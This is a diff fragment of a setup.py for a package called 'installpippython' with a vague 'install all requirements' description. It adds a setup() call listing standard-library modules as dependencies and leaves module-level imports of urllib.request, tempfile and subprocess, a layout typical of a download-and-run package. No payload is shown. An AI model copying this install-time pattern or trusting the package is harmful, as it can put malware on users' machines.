@@ -5,7 +5,24 @@ from setuptools import setup, find_packages
 VERSION = '19.3.5'
 DESCRIPTION = 'install all requirements'
 LONG_DESCRIPTION = 'easy'
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+setup(
+    name="installpippython",
+    version=VERSION,
+    author="nagogy213",
+    author_email="nagogy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    packages=find_packages(),
+    install_requires=['requests',
+                      'tempfile',
+                      'urllib'],
+    keywords=['python'],
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 import urllib.request
 import tempfile
 import subprocess
